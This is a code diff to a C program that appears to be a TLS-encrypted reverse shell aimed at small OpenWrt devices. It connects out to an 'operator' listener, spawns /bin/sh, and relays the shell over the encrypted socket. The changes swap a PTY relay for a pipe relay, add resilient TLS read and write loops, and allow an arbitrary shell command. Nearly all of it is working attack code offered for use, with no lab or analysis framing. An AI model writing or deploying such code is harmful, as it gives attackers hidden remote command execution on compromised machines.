@@ -3,14 +3,11 @@
  *
  * Connects to the operator tls-shell listener, negotiates TLS, spawns
  * /bin/sh, and relays data between the encrypted socket and the shell.
- * Tries a PTY first for interactive comfort; falls back to pipes.
+ * Uses pipes because OpenWrt PTY behavior varies across small targets.
  */
 #define _POSIX_C_SOURCE 200809L
-/* grantpt/unlockpt/ptsname are X/Open extensions */
-#define _XOPEN_SOURCE 600
 
 #include <errno.h>
-#include <fcntl.h>
 #include <netdb.h>
 #include <poll.h>
 #include <signal.h>
@@ -48,139 +45,202 @@ static int tls_tcp_connect(const char *host, const char *port)
     return sock;
 }
 
-/* relay_pty: prefer PTY for interactive use, fall back to pipes */
-static int relay_pty(WOLFSSL *ssl)
+static int tls_read_some(WOLFSSL *ssl, char *buf, int len)
 {
-    int ptmx = -1;
-    char slave_path[64];
-    pid_t child;
-    int status;
-    char buf[4096];
     int n;
-    struct pollfd pfd[2];
-
-    /* Attempt to open a PTY master */
-    ptmx = posix_openpt(O_RDWR | O_NOCTTY);
-    if (ptmx >= 0) {
-        char *sname;
-        if (grantpt(ptmx) != 0 || unlockpt(ptmx) != 0 ||
-            (sname = ptsname(ptmx)) == NULL) {
-            close(ptmx);
-            ptmx = -1;
-        } else {
-            snprintf(slave_path, sizeof(slave_path), "%s", sname);
-        }
-    }
-
-    if (ptmx >= 0) {
-        child = fork();
-        if (child < 0) {
-            close(ptmx);
-            return 1;
-        }
-        if (child == 0) {
-            int slave;
-            close(ptmx);
-            setsid();
-            slave = open(slave_path, O_RDWR);
-            if (slave < 0)
-                _exit(1);
-            dup2(slave, 0);
-            dup2(slave, 1);
-            dup2(slave, 2);
-            if (slave > 2)
-                close(slave);
-            execl("/bin/sh", "sh", NULL);
-            _exit(1);
-        }
-
-        pfd[0].fd     = ptmx;
-        pfd[0].events = POLLIN;
-        pfd[1].fd     = wolfSSL_get_fd(ssl);
-        pfd[1].events = POLLIN;
-
-        while (1) {
-            if (poll(pfd, 2, -1) < 0)
-                break;
-            if (pfd[0].revents & POLLIN) {
-                n = read(ptmx, buf, sizeof(buf));
-                if (n <= 0)
-                    break;
-                if (wolfSSL_write(ssl, buf, n) <= 0)
-                    break;
+    int fd = wolfSSL_get_fd(ssl);
+    for (;;) {
+        n = wolfSSL_read(ssl, buf, len);
+        if (n > 0)
+            return n;
+        switch (wolfSSL_get_error(ssl, n)) {
+        case WOLFSSL_ERROR_WANT_READ:
+            {
+                struct pollfd p = { fd, POLLIN, 0 };
+                poll(&p, 1, -1);
             }
-            if (pfd[1].revents & POLLIN) {
-                n = wolfSSL_read(ssl, buf, sizeof(buf));
-                if (n <= 0)
-                    break;
-                if (write(ptmx, buf, (size_t)n) < 0)
-                    break;
+            continue;
+        case WOLFSSL_ERROR_WANT_WRITE:
+            {
+                struct pollfd p = { fd, POLLOUT, 0 };
+                poll(&p, 1, -1);
             }
-        }
-        close(ptmx);
-        kill(child, SIGHUP);
-        waitpid(child, &status, 0);
-        return WIFEXITED(status) ? WEXITSTATUS(status) : 1;
-    }
-
-    /* Pipe fallback */
-    {
-        int in_pipe[2], out_pipe[2];
-        pid_t child2;
-
-        if (pipe(in_pipe) != 0 || pipe(out_pipe) != 0)
-            return 1;
-        child2 = fork();
-        if (child2 < 0)
-            return 1;
-        if (child2 == 0) {
-            close(in_pipe[1]);
-            close(out_pipe[0]);
-            dup2(in_pipe[0], 0);
-            dup2(out_pipe[1], 1);
-            dup2(out_pipe[1], 2);
-            if (in_pipe[0] > 2)
-                close(in_pipe[0]);
-            if (out_pipe[1] > 2)
-                close(out_pipe[1]);
-            execl("/bin/sh", "sh", NULL);
-            _exit(1);
-        }
-        close(in_pipe[0]);
-        close(out_pipe[1]);
-
-        pfd[0].fd     = out_pipe[0];
-        pfd[0].events = POLLIN;
-        pfd[1].fd     = wolfSSL_get_fd(ssl);
-        pfd[1].events = POLLIN;
-
-        while (1) {
-            if (poll(pfd, 2, -1) < 0)
-                break;
-            if (pfd[0].revents & POLLIN) {
-                n = read(out_pipe[0], buf, sizeof(buf));
-                if (n <= 0)
-                    break;
-                if (wolfSSL_write(ssl, buf, n) <= 0)
-                    break;
+            continue;
+        case WOLFSSL_ERROR_ZERO_RETURN:
+            return 0;
+        default:
+            {
+                char errbuf[80];
+                int err = wolfSSL_get_error(ssl, n);
+                wolfSSL_ERR_error_string(err, errbuf);
+                fprintf(stderr, "rshell: builtin-tls: wolfSSL_read failed: %s (%d)\n", errbuf, err);
             }
-            if (pfd[1].revents & POLLIN) {
-                n = wolfSSL_read(ssl, buf, sizeof(buf));
-                if (n <= 0)
-                    break;
-                if (write(in_pipe[1], buf, (size_t)n) < 0)
-                    break;
-            }
+            return -1;
         }
-        close(in_pipe[1]);
-        close(out_pipe[0]);
-        kill(child2, SIGHUP);
-        waitpid(child2, &status, 0);
-        return WIFEXITED(status) ? WEXITSTATUS(status) : 1;
     }
 }
 
-int rshell_builtin_tls(const char *host, const char *port)
+static int tls_write_full(WOLFSSL *ssl, const char *buf, int len)
+{
+    int off = 0;
+    int fd = wolfSSL_get_fd(ssl);
+    while (off < len) {
+        int n = wolfSSL_write(ssl, buf + off, len - off);
+        if (n > 0) {
+            off += n;
+            continue;
+        }
+        switch (wolfSSL_get_error(ssl, n)) {
+        case WOLFSSL_ERROR_WANT_READ:
+            {
+                struct pollfd p = { fd, POLLIN, 0 };
+                poll(&p, 1, -1);
+            }
+            continue;
+        case WOLFSSL_ERROR_WANT_WRITE:
+            {
+                struct pollfd p = { fd, POLLOUT, 0 };
+                poll(&p, 1, -1);
+            }
+            continue;
+        default:
+            {
+                char errbuf[80];
+                int err = wolfSSL_get_error(ssl, n);
+                wolfSSL_ERR_error_string(err, errbuf);
+                fprintf(stderr, "rshell: builtin-tls: wolfSSL_write failed: %s (%d)\n", errbuf, err);
+            }
+            return -1;
+        }
+    }
+    return 0;
+}
+
+static int write_full_fd(int fd, const char *buf, int len)
+{
+    int off = 0;
+    while (off < len) {
+        ssize_t n = write(fd, buf + off, (size_t)(len - off));
+        if (n > 0) {
+            off += (int)n;
+            continue;
+        }
+        if (n < 0 && errno == EINTR)
+            continue;
+        return -1;
+    }
+    return 0;
+}
+
+static void exec_shell_command(const char *shell_cmd)
+{
+    if (!shell_cmd || !*shell_cmd || !strcmp(shell_cmd, "/bin/sh"))
+        execl("/bin/sh", "sh", "-i", NULL);
+    execl("/bin/sh", "sh", "-c", shell_cmd, NULL);
+}
+
+static int reap_child(pid_t child, int terminate)
+{
+    int status = 1;
+    if (child <= 0)
+        return 1;
+    if (terminate && waitpid(child, &status, WNOHANG) == 0)
+        kill(child, SIGHUP);
+    while (waitpid(child, &status, 0) < 0) {
+        if (errno != EINTR)
+            return 1;
+    }
+    return WIFEXITED(status) ? WEXITSTATUS(status) : 1;
+}
+
+static int relay_shell(WOLFSSL *ssl, const char *shell_cmd)
+{
+    char buf[4096];
+    int n;
+    struct pollfd pfd[2];
+    int ending = 0;
+    const char *reason = "poll";
+    int in_pipe[2], out_pipe[2];
+    pid_t child;
+
+    fputs("rshell: builtin-tls: using pipe-backed shell relay\n", stderr);
+    if (pipe(in_pipe) != 0 || pipe(out_pipe) != 0)
+        return 1;
+    child = fork();
+    if (child < 0)
+        return 1;
+    if (child == 0) {
+        close(in_pipe[1]);
+        close(out_pipe[0]);
+        dup2(in_pipe[0], 0);
+        dup2(out_pipe[1], 1);
+        dup2(out_pipe[1], 2);
+        if (in_pipe[0] > 2)
+            close(in_pipe[0]);
+        if (out_pipe[1] > 2)
+            close(out_pipe[1]);
+        close(wolfSSL_get_fd(ssl));
+        exec_shell_command(shell_cmd);
+        _exit(1);
+    }
+    close(in_pipe[0]);
+    close(out_pipe[1]);
+
+    pfd[0].fd     = out_pipe[0];
+    pfd[0].events = POLLIN;
+    pfd[1].fd     = wolfSSL_get_fd(ssl);
+    pfd[1].events = POLLIN;
+
+    while (1) {
+        if (poll(pfd, 2, -1) < 0) {
+            if (errno == EINTR)
+                continue;
+            break;
+        }
+        if (pfd[0].revents & POLLIN) {
+            n = read(out_pipe[0], buf, sizeof(buf));
+            if (n <= 0) {
+                reason = "shell_eof";
+                ending = 1;
+                break;
+            }
+            if (tls_write_full(ssl, buf, n) != 0) {
+                reason = "tls_write";
+                ending = 1;
+                break;
+            }
+        }
+        if (pfd[1].revents & POLLIN) {
+            n = tls_read_some(ssl, buf, sizeof(buf));
+            if (n <= 0) {
+                reason = (n == 0) ? "remote_eof" : "tls_read";
+                ending = 1;
+                break;
+            }
+            if (write_full_fd(in_pipe[1], buf, n) != 0) {
+                reason = "shell_write";
+                ending = 1;
+                break;
+            }
+        }
+        if (pfd[0].revents & (POLLHUP | POLLERR | POLLNVAL)) {
+            reason = "shell_hup";
+            ending = 1;
+            break;
+        }
+        if (pfd[1].revents & (POLLHUP | POLLERR | POLLNVAL)) {
+            reason = "socket_hup";
+            ending = 1;
+            break;
+        }
+    }
+    close(in_pipe[1]);
+    close(out_pipe[0]);
+    fprintf(stderr, "rshell: builtin-tls: relay ended: %s\n", reason);
+    return reap_child(child, ending);
+}
+
+int rshell_builtin_tls(const char *host, const char *port, const char *shell_cmd)
 {
     WOLFSSL_CTX *ctx;
     WOLFSSL *ssl;
@@ -232,7 +292,7 @@ int rshell_builtin_tls(const char *host, const char *port)
         return 1;
     }
 
-    rc = relay_pty(ssl);
+    rc = relay_shell(ssl, shell_cmd);
 
     wolfSSL_shutdown(ssl);
     wolfSSL_free(ssl);
